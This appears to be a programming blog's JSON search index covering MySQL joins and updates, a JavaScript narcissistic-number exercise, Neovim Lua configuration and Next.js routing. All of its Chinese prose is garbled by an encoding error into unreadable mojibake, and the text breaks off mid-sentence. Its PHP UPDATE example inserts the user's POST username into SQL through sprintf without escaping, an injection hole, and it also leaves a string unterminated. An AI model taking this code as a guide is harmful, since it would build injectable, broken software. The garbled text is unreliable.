ç®—èµ·ä¾†æ˜¯ä¸‰å€‹å­—ï¼Œå°±ä»£è¡¨æ¬„ä½å€¼ä¹Ÿåªèƒ½æœ‰ä¸‰å€‹å­—ã€‚ é€²éšæŒ‡ä»¤åˆä½µå…©å€‹è³‡æ–™è¡¨å‚™è¨»ï¼šLEFT JOIN æ˜¯ç•™ä¸‹å·¦é‚Š table çš„æ‰€æœ‰è³‡æ–™ï¼ŒRIGHT JOIN æ˜¯åéä¾†ã€‚ æ‡¶äººåŒ…ï¼šSELECT è¦æ’ˆå‡ºä¾†çš„æ¬„ä½ FROM ç¬¬ä¸€å€‹ table LEFT JOIN ç¬¬äºŒå€‹ table ON å…©å€‹ table é—œè¯çš„æ¬„ä½ï¼ˆå¯ä»¥æŠŠ ON æƒ³æˆæ˜¯ WHERE åœ¨è¨­å®šæ¢ä»¶çš„æ„Ÿè¦ºï¼‰ã€‚ 1SELECT customers.name, orders.order_number FROM customers LEFT JOIN orders ON customers.client_id = orders.client_id; å‚™è¨»ï¼šå¦‚æœæ’å…¥çš„ tableï¼ˆåœ¨é€™é‚Šæ˜¯ ordersï¼‰ä¸­æ²’æœ‰è³‡æ–™ï¼Œå°±æœƒé¡¯ç¤º null å¾ customers è·Ÿ orders æŠŠã€Œé¡§å®¢åç¨±ã€ã€ã€Œè¨‚å–®ç·¨è™Ÿã€æ’ˆå‡ºä¾†ï¼Œå…©å€‹ table é—œè¯çš„æ¬„ä½æ˜¯ client_idã€‚ï¼ˆè¬›ç™½è©±ä¸€é»å°±æ˜¯æŠŠå…©å€‹ client_id ä¸€æ¨£çš„è³‡æ–™æ’ˆå‡ºä¾†ï¼‰ åƒè€ƒæˆ‘ç·´ç¿’çš„åœ–ç‰‡ï¼š customersï¼š ordersï¼š æŸ¥è©¢çµæœï¼š","link":"/2022/01/31/mysql-syntax/"},{"title":"MySQL ä¿®æ”¹è³‡æ–™åº«ä¸­çš„è³‡æ–™","text":"ä¿®æ”¹è³‡æ–™ã€‚ ç°¡è¿°1234567891011121314151617181920212223242526272829&lt;?phprequire_once('conn.php');// å‰ç«¯é€ä¾†çš„è³‡æ–™$id = $_POST['id'];$username = $_POST['username'];// æª¢æŸ¥ç©ºå€¼if (empty($id) || empty($username)) { die('è«‹è¼¸å…¥ id å’Œ username');}// è¨˜å¾— username æ˜¯å­—ä¸²æ‰€ä»¥è¦ç”¨å¼•è™ŸåŒ…èµ·ä¾†$sql2 = sprintf('UPDATE users SET username=\"%s\" WHERE id=%d', $username , $id);// ä¸‹ query$result = $conn-&gt;query($sql2);// æª¢æŸ¥å›å‚³å€¼if (!$result) { die($conn-&gt;error);}// æª¢æŸ¥å½±éŸ¿äº†å¹¾åˆ—if ($conn-&gt;affected_rows &gt;= 1) { echo 'ä¿®æ”¹æˆåŠŸ';} else { echo 'ä¿®æ”¹å¤±æ•—;}?&gt; é€™é‚Šè£œå……ä¸€ä¸‹ä»€éº¼æ™‚å€™æœƒå‡ºç¾ã€Œå½±éŸ¿äº† 0 åˆ—ã€ï¼š ä¿®æ”¹çš„ username è·ŸåŸæœ¬çš„ä¸€æ¨¡ä¸€æ¨£ è¼¸å…¥ä¸€å€‹ä¸å­˜åœ¨çš„ idï¼ˆç”šè‡³è¼¸å…¥æˆå­—ä¸²ä¹Ÿä¸æœƒå‡ºéŒ¯ï¼‰","link":"/2022/02/03/mysql-update-data/"},{"title":"æ°´ä»™èŠ±æ•¸","text":"ä¾†è‡ª LIOJï¼Œé‚„è »å€¼å¾—ç·´ç¿’çš„é¡Œç›®ã€‚ è§£é¡Œæ–¹å‘ æ€éº¼çŸ¥é“ä¸€å€‹æ•¸å­—æœ‰å¹¾ä½æ•¸ï¼Ÿ æ€éº¼å–å‡ºæ¯å€‹ä½æ•¸çš„æ•¸å­—ï¼Ÿ æ±‚å‡ºä½æ•¸æŠŠä¸€å€‹æ•¸å­—ä¸€ç›´ /10ï¼ˆè¨˜å¾—ç„¡æ¢ä»¶æ¨å»ï¼‰ï¼Œç›´åˆ° 0 ç‚ºæ­¢ã€‚çœ‹ç¸½å…±é™¤å¹¾æ¬¡ï¼Œå°±ä»£è¡¨é€™å€‹æ•¸å­—æœ‰å¹¾ä½æ•¸ï¼š 1234567891011121314function digitCount(n) { // n=0 æ™‚æœƒè¢«ç•¶ä½œ 0 ä½æ•¸ï¼Œæ‰€ä»¥åšé»è™•ç† if(n === 0) return 1 let result = 0 // ç›´åˆ° 0 ç‚ºæ­¢ while(n !== 0) { n = Math.floor(n/10) result++ } return result}digitCount(0) // 1digitCount(12) // 2digitCount(123) // 3 å–å‡ºæ¯å€‹ä½æ•¸çš„æ•¸å­—å°ä¸€å€‹æ•¸å­—å–é¤˜æ•¸ %10 å¯ä»¥å–åˆ°ã€Œæœ€å¾Œä¸€ä½æ•¸å­—ã€ï¼Œæ¥è‘—æ­é…è¿´åœˆä½¿ç”¨ /10 ä¾†æ›´æ–°æ•¸å­—ï¼ˆå»æ‰æœ€å¾Œä¸€ä½æ•¸ï¼‰ï¼Œå°±å¯ä»¥å–å‡ºæ¯ä¸€å€‹ä½æ•¸çš„æ•¸å­—ï¼š 12345678function printSingleDigit(n) { while(n !== 0) { const number = n % 10 console.log(number) n = Math.floor(n/10) }}printSingleDigit(123) è¼¸å‡ºçµæœï¼š 123321 è§£æ³•ä¸Šé¢å•é¡Œæå®šå¾Œï¼Œæ¥ä¸‹ä¾†åªè¦ä¾æ“šæ°´ä»™èŠ±æ•¸çš„å®šç¾©ä¾†è§£é¡Œå³å¯ï¼š 12345678910111213141516171819function isNarcissistic(n) { // å¹¾ä½æ•¸ let digit = digitCount(n) // å„²å­˜æ¯ä¸€ä½æ•¸çš„åŠ ç¸½ let sum = 0 // è¤‡è£½ä¸€ä»½æ•¸å­— let m = n // è¨ˆç®—ç¸½å’Œ while(m !== 0) { // æ¯ä¸€ä½æ•¸ x ä½æ•¸ sum += (m%10) ** digit // å»é™¤æœ€å¾Œä¸€ä½æ•¸ m = Math.floor(m/10) } console.log(sum === n)}isNarcissistic(5) // trueisNarcissistic(1634) // trueisNarcissistic(1024) // false é€™è£¡åšå…©å€‹å°æé†’ï¼š n çš„å€¼å¿…é ˆæ‹·è²ä¸€ä»½ï¼Œä¸ç„¶æœ€å¾Œæœƒè®Šæˆ 0ï¼Œä¹Ÿå°±æ²’è¾¦æ³•åš sum === n çš„åˆ¤æ–· m%10 ** digitï¼Œå…¶ä¸­ m%10 å¿…é ˆæ‹¬è™Ÿèµ·ä¾†ï¼Œå¦å‰‡æœƒå…ˆè¨ˆç®— 10**digit ä½œå¼Šè§£æ³•ï¼è½‰æˆå­—ä¸²å‰é¢æ˜¯ç”¨æ­£çµ±çš„æ•¸å­¸è¨ˆç®—ä¾†å–å¾—æ¯ä¸€ä½æ•¸é‚„æœ‰ç¸½ä½æ•¸ï¼Œä½†ä½ ä»”ç´°æƒ³æƒ³ï¼Œå¦‚æœè®Šæˆå­—ä¸²çš„è©±ï¼Œè¦åšåˆ°é‚£äº›äº‹å°±å®¹æ˜“å¾ˆå¤šï¼Œä¾‹å¦‚èªª '123'ï¼š å–å¾—æ¯ä¸€ä½æ•¸ str[0] = 1 str[1] = 2 str[2] = 3 å–å¾—ç¸½ä½æ•¸ str.length = 3 æ‰€ä»¥æŠŠå‰›å‰›çš„ä¾‹å­æ”¹å¯«ä¸€ä¸‹ï¼š 1234567891011121314function isNarcissisticString(n) { // è½‰æˆå­—ä¸² const str = n + '' // ç¸½ä½æ•¸ const digits = str.length let sum = 0 for(let i=0; i&lt;str.length; i++) { sum += Number(str[i]) ** digits } console.log(sum === n)}isNarcissisticString(5) // trueisNarcissisticString(1634) // trueisNarcissisticString(1024) // false ä¸€æ¨£å¯ä»¥æ±‚å‡ºæ­£ç¢ºçš„çµæœå”·ï¼","link":"/2021/12/26/narcissistic-number/"},{"title":"Neovimï¼é…ç½®ç­†è¨˜","text":"æŠŠä¸€äº›åŸºæœ¬çš„æ¦‚å¿µè¨˜éŒ„ä¸‹ä¾†ã€‚ è£œå……çŸ¥è­˜1. ä»€éº¼æ˜¯ &lt;CR&gt;ï¼Ÿ æ³¨æ„åˆ°æœ‰äº›æŒ‡ä»¤å¾Œé¢æœ‰ &lt;CR&gt;ï¼ˆcarriage returnï¼‰ é€™å€‹å­—ï¼Œé€™å€‹èƒŒå¾Œçš„å«ç¾©å…¶å¯¦å¾ˆç°¡å–®ï¼Œå°±æ˜¯å¹«ä½ æŒ‰ä¸‹ Enter ä¾†åŸ·è¡Œé€™å€‹æŒ‡ä»¤çš„æ„æ€ã€‚ 2. ä»€éº¼æ˜¯ Bufferï¼Ÿ ç°¡å–®ä¾†èªªå¯ä»¥æƒ³æˆæ˜¯ã€Œåˆ†é ï¼ˆTabï¼‰ã€çš„æ„æ€ï¼Œä¸éå¯¦éš›ä¸Šé‚„æ˜¯æœ‰äº›å·®ç•°ã€‚ 3. åœ¨ lua ä¸­å¯« vim æŒ‡ä»¤ æœ‰äº›æ™‚å€™ä½ å¯èƒ½æœƒåœ¨å®˜æ–¹æ–‡ä»¶ä¸­çœ‹åˆ°é¡ä¼¼é€™æ¨£çš„é…ç½®ï¼š 12345let g:VM_maps = {}let g:VM_maps['Find Under'] = '&lt;C-d&gt;' \" replace C-nlet g:VM_maps['Find Subword Under'] = '&lt;C-d&gt;' \" replace visual C-nlet g:VM_maps[\"Select Cursor Down\"] = '&lt;M-C-Down&gt;' \" start selecting downlet g:VM_maps[\"Select Cursor Up\"] = '&lt;M-C-Up&gt;' \" start selecting up ä½†å¦‚æœä½ æ˜¯ç”¨ lua ä¾†æ’°å¯«çš„è©±ï¼Œå¯ä»¥æ”¹å¯«æˆé€™æ¨£å­ï¼š 1234567vim.cmd([[ let g:VM_maps = {} let g:VM_maps['Find Under'] = '&lt;C-d&gt;' let g:VM_maps['Find Subword Under'] = '&lt;C-d&gt;' let g:VM_maps['Add Cursor Down'] = '&lt;C-n&gt;' let g:VM_maps['Add Cursor Up'] = '&lt;C-p&gt;']]) Packer.vim çš„ç›¸é—œæŒ‡ä»¤ PackerInstall å®‰è£å¥—ä»¶ PackerUpdate æ›´æ–°å¥—ä»¶ PcakerSync æ›´æ–°å¥—ä»¶ä¸¦ç”¢ç”Ÿä¸€å€‹ packer_compiled.luaï¼Œå¯ä»¥æƒ³æˆæ˜¯ç·©å­˜çš„æ¦‚å¿µå§ï¼Œä¸»è¦æ˜¯ç”¨ä¾†æå‡è¼‰å…¥é€Ÿåº¦è€Œå­˜åœ¨çš„ åŸºæœ¬çµæ§‹1234567â”œâ”€â”€ README.mdâ”œâ”€â”€ init.lua // nvim çš„é€²å…¥é»ï¼ˆåŸºæœ¬ä¸Šå°±æ˜¯æŠŠæ‰€æœ‰ lua çš„æ±è¥¿å¼•å…¥ï¼‰â”œâ”€â”€ lua // æ”¾ lua ç›¸é—œçš„æª”æ¡ˆâ”‚&nbsp;&nbsp; â””â”€â”€ userâ”‚&nbsp;&nbsp; â”œâ”€â”€ options.luaâ””â”€â”€ plugin â””â”€â”€ packer_compiled.lua é™„è¨»ï¼šuser è³‡æ–™å¤¾æ˜¯ç‚ºäº†é¿å… .lua æ’åè€Œé–‹çš„ æ‰“é–‹ .config/nvim/lua/user/options.lua å¯ä»¥çœ‹åˆ°ä¸€äº›å…§å®¹ï¼š 1234567vim.opt.backup = false -- creates a backup filevim.opt.clipboard = \"unnamedplus\" -- allows neovim to access the system clipboardvim.opt.cmdheight = 1 -- more space in the neovim command line for displaying messagesvim.opt.completeopt = { \"menuone\", \"noselect\" } -- mostly just for cmpvim.opt.conceallevel = 0 -- so that `` is visible in markdown filesvim.opt.fileencoding = \"utf-8\" -- the encoding written to a filevim.opt.hlsearch = true -- highlight all matches on previous search pattern ä¸»è¦ç”¨ä¾†è¨­å®š nvim çš„åŸºæœ¬é…ç½®ï¼Œå¦‚æœæƒ³çŸ¥é“æ‰€æœ‰èƒ½è¨­å®šçš„å…§å®¹èˆ‡ç´°ç¯€çš„è©±ï¼Œå¯ä»¥ä¸‹ :help options ä¾†æœå°‹ã€‚ æ¥è‘— init.lua çš„å…§å®¹æ˜¯é€™æ¨£ï¼š 1require \"user.options\" æ³¨æ„åœ¨å¼•å…¥çš„æ™‚å€™ä¸éœ€è¦æŠŠå®Œæ•´è·¯å¾‘è·Ÿå‰¯æª”åå¡«å…¥ï¼ˆè·Ÿ ES Module åœ¨å¼•å…¥çš„æ„Ÿè¦ºæœ‰é»åƒï¼‰ï¼Œåƒé€™æ¨£ lua.user.options.luaï¼Œåªéœ€è¦ user.options å³å¯ã€‚ Keymapsæ‰“é–‹ .config/nvim/lua/user/keymaps.lua æœƒçœ‹åˆ°åº•ä¸‹å…§å®¹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738-- ç”¨è®Šæ•¸å„²å­˜ vim.keymap.set é€™å€‹å‡½å¼local keymap = vim.keymap.set-- å…±ç”¨çš„ optionslocal opts = { silent = true }--Remap space as leader keykeymap(\"\", \"&lt;Space&gt;\", \"&lt;Nop&gt;\", opts)vim.g.mapleader = \" \"-- Modes-- normal_mode = \"n\",-- insert_mode = \"i\",-- visual_mode = \"v\",-- visual_block_mode = \"x\",-- term_mode = \"t\",-- command_mode = \"c\",-- Normal ---- Better window navigationkeymap(\"n\", \"&lt;C-h&gt;\", \"&lt;C-w&gt;h\", opts)keymap(\"n\", \"&lt;C-j&gt;\", \"&lt;C-w&gt;j\", opts)keymap(\"n\", \"&lt;C-k&gt;\", \"&lt;C-w&gt;k\", opts)keymap(\"n\", \"&lt;C-l&gt;\", \"&lt;C-w&gt;l\", opts)-- Resize with arrowskeymap(\"n\", \"&lt;C-Up&gt;\", \":resize -2&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;C-Down&gt;\", \":resize +2&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;C-Left&gt;\", \":vertical resize -2&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;C-Right&gt;\", \":vertical resize +2&lt;CR&gt;\", opts)-- Navigate bufferskeymap(\"n\", \"&lt;S-l&gt;\", \":bnext&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;S-h&gt;\", \":bprevious&lt;CR&gt;\", opts)-- Clear highlightskeymap(\"n\", \"&lt;leader&gt;h\", \"&lt;cmd&gt;nohlsearch&lt;CR&gt;\", opts)-- .... é€™é‚Šåªè§£é‡‹ä¸»è¦çš„éƒ¨åˆ†ï¼š vim.g.mapleader = \" \" é€™æ˜¯ç”¨ä¾†è¨­å®š &lt;leader&gt;ï¼ˆå¸¸ç”¨å¿«æ·éµï¼‰ï¼Œä¹‹å¾Œå°±å¯ä»¥ç”¨ &lt;leader&gt;h çš„æ–¹å¼ä¾†è¡¨ç¤ºï¼ˆã€Œç©ºç™½éµ + hï¼‰ keymap(\"n\", \"&lt;leader&gt;h\", \"&lt;cmd&gt;nohlsearch&lt;CR&gt;\", opts) ä»–åªæ˜¯ä¸€å€‹ç”¨ä¾†è¨­å®šå¿«æ·éµå‡½å¼ï¼Œéœ€è¦çš„åƒæ•¸ç‚ºï¼š 1map('æ¨¡å¼', 'æŒ‰é”®', 'æ˜ å°„ä¸ºXX', opts) Pluginå…ˆä¾†ä»‹ç´¹é€™è£¡æœƒç”¨åˆ°çš„ Plugin Managerã€‚ç‚ºäº†å¯ä»¥ç”¨ lua ä¾†æ’°å¯« configï¼Œæ‰€ä»¥é€™é‚Šæœƒç”¨çš„æ˜¯ packer.nvimï¼ŒåŸºæœ¬ä¸Šå°±è·Ÿ vim-plug æ˜¯å·®ä¸å¤šçš„æ±è¥¿ã€‚å”¯ä¸€çš„å·®åˆ¥åœ¨æ–¼ vim-plug åªèƒ½å¯« vim scriptï¼Œä½† packer.nvim å¯ä»¥å¯« luaã€‚ æ¥ä¸‹ä¾†çœ‹åˆ° .config/nvim/lua/user/plugins.luaï¼Œé€™é‚Šæˆ‘ç›´æ¥å¯«ä¸­æ–‡è¨»è§£ï¼Œçœ‹å®Œä½ å¤§æ¦‚å°±çŸ¥é“é€™å€‹æª”æ¡ˆåœ¨å¹¹å˜›äº†ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253local fn = vim.fn-- è‡ªå‹•å®‰è£ Packerï¼ˆå¦‚æœç›®å‰æ²’æœ‰ï¼‰local install_path = fn.stdpath \"data\" .. \"/site/pack/packer/start/packer.nvim\"if fn.empty(fn.glob(install_path)) &gt; 0 then PACKER_BOOTSTRAP = fn.system { \"git\", \"clone\", \"--depth\", \"1\", \"https://github.com/wbthomason/packer.nvim\", install_path, } print \"Installing packer close and reopen Neovim...\" vim.cmd [[packadd packer.nvim]]end-- åªè¦å„²å­˜é€™å€‹æª”æ¡ˆå°±è‡ªå‹•åŸ·è¡Œ PackerSyncï¼ˆPacker çš„æŒ‡ä»¤ï¼‰vim.cmd [[ augroup packer_user_config autocmd! autocmd BufWritePost plugins.lua source &lt;afile&gt; | PackerSync augroup end]]-- å¦‚æœæ‰¾ä¸åˆ° packer å°±ç›´æ¥è·³æ‰ï¼ˆä¸å¾€ä¸‹åŸ·è¡Œï¼‰local status_ok, packer = pcall(require, \"packer\")if not status_ok then returnend-- ç”¨ popup ä¾†é¡¯ç¤ºç›®å‰çš„å®‰è£é€²åº¦ï¼ˆé è¨­æ˜¯åˆ†å‰²ä¸€å€‹æ–°è¦–çª—ï¼‰packer.init { display = { open_fn = function() return require(\"packer.util\").float { border = \"rounded\" } end, },}-- åˆ°é€™é‚Šæ‰æ˜¯çœŸæ­£è·Ÿå®‰è£å¥—ä»¶æœ‰é—œçš„ codereturn packer.startup(function(use) use \"wbthomason/packer.nvim\" -- å¥—ä»¶äºŒ use \"nvim-lua/popup.nvim\" -- å¥—ä»¶äºŒ use \"nvim-lua/plenary.nvim\" -- å¥—ä»¶ä¸‰ -- Automatically set up your configuration after cloning packer.nvim -- Put this at the end after all plugins if PACKER_BOOTSTRAP then require(\"packer\").sync() endend) å®‰è£å¥½çš„å¥—ä»¶å¯ä»¥å¾ /Users/peanu/.local/share/nvim/site/pack/packer/start æ‰¾åˆ°ã€‚ï¼ˆç°¡å–®ä¾†èªªå°±æ˜¯ nvim/site è£¡é¢ï¼‰ è‡³æ–¼ nvim è£¡é¢çš„å…¶ä»–æª”æ¡ˆæˆ–è³‡æ–™å¤¾æ˜¯ç”¨ä¾†çµ¦å¥—ä»¶å­˜æ”¾ä¸€äº›è³‡æ–™ç”¨çš„ï¼Œä¸ç”¨å¤ªåœ¨æ„ã€‚ Lazy Loadingç°¡å–®ä¾†èªªä½ å¯ä»¥è¨­å®šæŸäº›å¥—ä»¶ä¸è¦åœ¨ä¸€é–‹å§‹æ‰“é–‹ nvim çš„æ™‚å€™ç›´æ¥è¼‰å…¥ï¼Œä¾‹å¦‚é€™å€‹å®˜æ–¹ç¯„ä¾‹ï¼š 1234567return require('packer').startup(function(use) use 'wbthomason/packer.nvim' use '9mm/vim-closer' -- Lazy loading: -- Load on specific commands use {'tpope/vim-dispatch', opt = true, cmd = {'Dispatch', 'Make', 'Focus', 'Start'}} é™„è¨»ï¼šuse å¾Œé¢å¯ä»¥æ¥ä¸€å€‹ lua çš„ Tableï¼ˆä¸€ç¨®è³‡æ–™å‹æ…‹ï¼‰ ç•¶æˆ‘é€™æ¨£å­è¨­å®šå¾Œ tpope/vim-dispatch å°±åªæœƒåœ¨æˆ‘è¼¸å…¥ :Dispatch æˆ– :Make ç­‰ç­‰çš„æŒ‡ä»¤å¾Œæ‰æœƒè¢«è¼‰å…¥ã€‚ é †é“ä¸€æï¼Œåªè¦æ˜¯è¨­å®š Lazy Loading çš„å¥—ä»¶éƒ½æœƒå‡ºç¾åœ¨ /Users/peanu/.local/share/nvim/site/pack/packer/opt è£¡ã€‚ Error handlingä¸€èˆ¬ä¾†èªªç•¶ nvim æ‰“é–‹æ™‚è‹¥æ‰¾ä¸åˆ°å¥—ä»¶çš„è©±ï¼Œå°±æœƒç›´æ¥å™´ä¸€å€‹å…¨å±çš„ Error çµ¦ä½ çœ‹ï¼Œåƒé€™æ¨£ï¼š å¦‚æœæ˜¯ç”¨ vim script çš„è©±æ˜¯æ²’è¾¦æ³•åšéŒ¯èª¤è™•ç†çš„ï¼Œé€™é‚Šç›®å‰çš„å¯«æ³•æ˜¯é€™æ¨£å­ï¼š 12345require \"user.options\"require \"user.keymaps\"require \"user.plugins\"-- vim scriptvim.cmd \"colorscheme tokyonight-moon\" ä½†å¦‚æœæ˜¯ç”¨ lua çš„è©±å°±ä¸ä¸€æ¨£äº†ï¼Œæˆ‘å€‘å¯ä»¥æ”¹æˆé€™æ¨£å­ï¼š 1234require \"user.options\"require \"user.keymaps\"require \"user.plugins\"require \"user.colorscheme\" ä¸¦å¡«å…¥é€™æ¨£çš„å…§å®¹ï¼š 1234567891011-- æƒ³å¼•å…¥çš„ä¸»é¡Œlocal colorscheme = \"tokyonight-moon\"-- pcall å›å‚³ç¬¬ä¸€å€‹å€¼æ˜¯ç‹€æ…‹ï¼Œç¬¬äºŒå€‹æ˜¯ module çš„å›å‚³å€¼ï¼ˆä»¥é€™ä¾‹å­ä¾†èªªæ²’æœ‰æ‰€ä»¥å°±ç”¨ _ è¡¨ç¤ºï¼‰-- \"..\" æ˜¯å­—ä¸²é€£çµçš„æ„æ€local status_ok, _ = pcall(vim.cmd, \"colorscheme \" .. colorscheme)-- å¦‚æœä¸ ok çš„è©±å°±åœ¨ç‹€æ…‹åˆ—é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯if not status_ok then vim.notify(\"colorscheme \" .. colorscheme .. \" not found!\") returnend é€™æ¨£å­ç•¶å¥—ä»¶è¼‰å…¥å¤±æ•—æ™‚å°±åªæœƒé¡¯ç¤ºè¨Šæ¯ï¼Œä¸æœƒå¥½åƒæ•´å€‹ç¨‹å¼éƒ½å£æ‰äº†ä¸€æ¨£ï¼š è¨­å®šå¥—ä»¶çš„ mappingåŸºæœ¬ä¸Šè¨­å®šå¿«æ·éµçš„æ–¹å¼å°±æ˜¯å…ˆçŸ¥é“ä½ æƒ³è¦çš„æŒ‡ä»¤æ˜¯ä»€éº¼ï¼Ÿï¼Œä¸¦ä¸”åœ¨è¨­å®šå°æ‡‰çš„æŒ‰éµã€‚ ä»¥ ä¾†èªªï¼Œä½ å¯ä»¥åœ¨ config ä¸­é€™æ¨£å­å¯«ï¼š 1234567891011mapping = { -- &lt;C-k&gt; å°æ‡‰åˆ°å¾€å‰ä¸€å€‹é¸é …é¸ [\"&lt;C-k&gt;\"] = cmp.mapping.select_prev_item(), -- &lt;C-k&gt; å°æ‡‰åˆ°å¾€ä¸‹ä¸€å€‹é¸é …é¸ [\"&lt;C-j&gt;\"] = cmp.mapping.select_next_item(), -- &lt;C-k&gt; ç§»å‹• doc ä¸­çš„æ»¾è»¸ [\"&lt;C-b&gt;\"] = cmp.mapping(cmp.mapping.scroll_docs(-1), { \"i\", \"c\" }), -- &lt;C-k&gt; ç§»å‹• doc ä¸­çš„æ»¾è»¸ [\"&lt;C-f&gt;\"] = cmp.mapping(cmp.mapping.scroll_docs(1), { \"i\", \"c\" }), -- ç•¥.... } TelescopeåŠŸèƒ½ :Telescope find_files æ‰¾æª”æ¡ˆ :Telescope git_branches æ‰¾åˆ†æ”¯ï¼ˆç›®å‰ pwd ä½ç½®ï¼‰ :Telescope live_grep å…¨åŸŸæœå°‹é—œéµå­—ï¼ˆéœ€å®‰è£ ripgrepï¼‰ è¦–çª—é–‹å•Ÿå¾Œçš„å¿«æ·éµå¯åƒè€ƒ telescope.lua æª”æ¡ˆçš„å…§å®¹ã€‚","link":"/2022/10/22/neovim-config-note/"},{"title":"Next.jsï¼404 é é¢","text":"æ¯å€‹ç¶²ç«™éƒ½æœ‰çš„ 404 é é¢ã€‚ ç°¡è¿°å¦‚æœæƒ³å®šç¾©è‡ªå·±çš„ 404 é é¢çš„è©±ï¼Œå¯ä»¥åœ¨ /pages åº•ä¸‹å»ºç«‹ 404.jsï¼Œè£¡é¢å°±å¯ä»¥å¡«å…¥è‡ªå®šç¾©çš„å…§å®¹äº†ï¼š 1234567891011121314151617import Link from 'next/link'import React from 'react'export default function NotFound() { return ( &lt;div className='not-found'&gt; &lt;h1&gt;Ooops...&lt;/h1&gt; &lt;h2&gt;That page cannot be found :&lt;&lt;/h2&gt; &lt;p&gt; Go back to the &lt;Link href='/'&gt; &lt;a&gt;Homepage&lt;/a&gt; &lt;/Link&gt; &lt;/p&gt; &lt;/div&gt; )}","link":"/2022/09/03/next-404-page/"},{"title":"Next.jsï¼å‹•æ…‹è·¯ç”±","text":"æ¯”è¼ƒä¸ä¸€æ¨£çš„ä½œæ³•ã€‚ ç°¡è¿°å¾ˆå¤šæ™‚å€™æˆ‘å€‘æœƒç¢°åˆ°å‹•æ…‹è·¯ç”±çš„éœ€æ±‚ï¼Œåƒæ˜¯æŸç¯‡æ–‡ç« çš„é é¢å¯èƒ½æ˜¯ /posts/idï¼Œé‚„æ˜¯æŸæ¨£ç”¢å“ç´°ç¯€é é¢æ˜¯ /products/id çš„é€™ç¨®è·¯ç”±ï¼Œé€™ç¨®æ™‚å€™å°±éœ€è¦è®“ id é€™ä¸€æ®µè®Šæˆæ˜¯ã€Œå‹•æ…‹ã€çš„ã€‚ åœ¨ Next è£¡é¢çš„ä½œæ³•æ˜¯é€™æ¨£ï¼š æŠŠè¦å‹•æ…‹çš„é é¢ç”¨ [] ä¾†å‘½åï¼Œä¾‹å¦‚ post/[id].js è©²é é¢å¿…é ˆè¨­ç½® getStaticPaths ä¾†å®šç¾©æ‰€æœ‰å¯èƒ½çš„è·¯ç”± è©²é é¢æœ€å¾Œå†é€é getStaticProps ä¸¦æ ¹æ“šè·¯ç”±åƒæ•¸ä¾†å­˜å–å°æ‡‰çš„è³‡æ–™ é™„ä¸Šå®˜ç¶²çµ¦çš„è²¼åˆ‡æµç¨‹ï¼š æœ€å¾Œé€™å€‹é é¢çš„å…§å®¹æœƒé•·çš„åƒé€™æ¨£ï¼š 12345678910111213141516171819202122232425262728293031323334import Layout from '../../components/layout'import { getAllPostIds, getPostData } from '../../lib/post'// 1. å–å¾—æ‰€æœ‰çš„ [id] è·¯å¾‘export async function getStaticPaths() { const paths = getAllPostIds() return { paths, fallback: false }}// 2. é€™é‚Šå°±å¯ä»¥å­˜å–åˆ° [id]ï¼Œä¸¦å»æ‰“å°æ‡‰çš„ API æ‹¿è³‡æ–™export async function getStaticProps({ params }) { const postData = getPostData(params.id) return { props: { postData } }}// 3. æœ€å¾Œæ¸²æŸ“å‡ºç•«é¢ï¼ˆpre-renderingï¼‰export default function Post({ postData }) { return ( &lt;Layout&gt; {postData.title} &lt;br /&gt; {postData.id} &lt;br /&gt; {postData.date} &lt;/Layout&gt; )} é™„è¨»ï¼šé—œæ–¼ getStaticPaths çš„å›å‚³æ ¼å¼ ä¸Šé¢çš„ç¯„ä¾‹å› ç‚ºæœ‰æŠŠ code æ‹†é–‹ä¾†å¯«æ‰€ä»¥ä¸æ˜¯å¾ˆæ¸…æ¥šï¼ŒgetStaticPaths çš„å›å‚³å€¼æ˜¯æœ‰éµå¾ªæŸå€‹æ ¼å¼çš„ï¼Œä¸å¯ä»¥äº‚å‚³ï¼š 12345678const returnValue = { paths: { params: { id: data.id.toString() } }, fallback: false} ç‚ºä»€éº¼è¦æœ‰ getStaticPathsï¼Ÿé€™é‚Šæƒ³åšå€‹è£œå……ï¼Œå› ç‚ºå¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£åŸæœ¬æ˜¯å¯« SPA çš„è©±å¯èƒ½æœƒæœ‰é»ç–‘æƒ‘ï¼Œã€Œç‚ºä»€éº¼éœ€è¦å…ˆç”¢ç”Ÿ path æ‰è¡Œï¼Ÿã€ é¦–å…ˆè¦åœ¨å¼·èª¿ä¸€æ¬¡ï¼šNext æ˜¯é€šå¸¸æ˜¯åŸºæ–¼ SSR/SSG ä¾†ç”¢ç”Ÿç¶²é å…§å®¹ï¼Œæ‰€ä»¥é€™ä»£è¡¨æˆ‘å€‘åœ¨ build çš„æ™‚å€™å°±å¿…é ˆçŸ¥é“ã€Œæœ‰å¤šå°‘å€‹é é¢è¦ç”¢ç”Ÿï¼Ÿã€ å‡è¨­æˆ‘å€‘çš„ /post/[id] æœ‰ 10 ç¯‡æ–‡ç« ï¼Œé‚£ Next å°±æ‡‰è©²è¦åœ¨ Server ç”¢ç”Ÿå‡º 10 å€‹ HTMLï¼š /post/1 /post/2 /post/3 ... æ‰€ä»¥æˆ‘å€‘ä¸€å®šè¦é€éæŸç¨®æ–¹å¼ä¾†å‘Šè¨´ Next é€™ä»¶äº‹æƒ…ï¼Œé€™å€‹å°±æ˜¯ getStaticPaths èƒŒå¾Œçš„å«ç¾©ã€‚ é—œæ–¼ fallbacké—œæ–¼é€™éƒ¨åˆ†å¯èƒ½æœ‰é»å°è¤‡é›œï¼Œå¦‚æœæƒ³çŸ¥é“æ›´è©³ç´°çš„å…§å®¹æˆ‘æ¨è–¦çœ‹ é€™ç¯‡æ–‡ç« ï¼Œè¬›çš„é‚„è »æ¸…æ¥šçš„ã€‚é€™é‚Šæˆ‘åªæœƒå¤§æ¦‚èªªä¸€ä¸‹æ¯ç¨® option çš„ç”¨é€”ã€‚ fallback: false é€™å€‹å°±æ˜¯å‡è¨­ user åˆ°äº†æ²’æœ‰ç”¢ç”Ÿçš„é é¢æ™‚ï¼ŒNext æœƒè‡ªå‹•è·³è½‰åˆ° 404 é é¢ã€‚ fallback: true ç•¶ user åˆ°äº†æ²’æœ‰ç”¢ç”Ÿçš„é é¢æ™‚ï¼ŒNext æœƒèµ°é€™æ¨£çš„æµç¨‹ï¼š 